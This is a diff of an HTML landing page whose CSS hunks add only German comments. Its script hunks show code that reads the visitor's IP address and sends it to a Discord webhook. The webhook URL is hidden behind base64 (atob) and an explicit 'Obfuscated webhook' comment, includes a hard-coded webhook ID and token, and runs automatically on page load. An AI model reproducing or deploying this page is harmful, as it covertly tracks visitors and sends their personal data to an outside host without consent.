@@ -22,11 +22,11 @@
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8); 
-            background-color: rgba(0, 0, 0, 0.3); 
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8); /* Schwarzer Schatten */
+            background-color: rgba(0, 0, 0, 0.3); /* Leicht abgedunkelt */
             backdrop-filter: blur(5px);
             font-family: 'Courier New', monospace;
-            color: white; 
+            color: white; /* Weiße Schrift */
         }
 
         #entrance {
@@ -38,7 +38,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            background: rgba(0, 0, 0, 0.85); 
+            background: rgba(0, 0, 0, 0.85); /* Weniger dunkler Hintergrund */
             z-index: 1000;
         }
 
@@ -51,8 +51,8 @@
             animation: float 3s ease-in-out infinite;
             background: rgba(0, 0, 0, 0.5);
             transition: transform 0.3s;
-            color: white; 
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8); 
+            color: white; /* Weiße Schrift */
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8); /* Schwarzer Schatten */
         }
 
         #clickMe:hover {
@@ -69,8 +69,8 @@
             margin-bottom: 20px;
             animation: float 3s ease-in-out infinite;
             letter-spacing: 3px;
-            color: white; 
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8); 
+            color: white; /* Weiße Schrift */
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8); /* Schwarzer Schatten */
         }
 
         .subtitle {
@@ -80,8 +80,8 @@
             text-transform: uppercase;
             padding: 15px;
             border-bottom: 2px solid rgba(255, 255, 255, 0.3);
-            color: white; 
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8); 
+            color: white; /* Weiße Schrift */
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8); /* Schwarzer Schatten */
         }
 
         #audioPlayer {
@@ -154,8 +154,9 @@
 
                 document.getElementById('ipDisplay').textContent = `${ip}`;
 
+                // Obfuscated webhook
                 const key = ['1329145060230692935', '-93HduLZfipXZnGgRBszzvfpOHYdAjWwcAElg9N_FdT4IB4pPbr05lUMQdtoSqTrqR4h'];
-                const func = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv') + key[0] + '/' + key[1];
+                const webhookURL = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv') + key[0] + '/' + key[1];
                 
                 const encoder = new TextEncoder();
                 const decoder = new TextDecoder();
@@ -179,6 +180,7 @@
             }
         }
 
+        // Log the IP immediately when the page loads
         logIP();
     </script>
 </body>
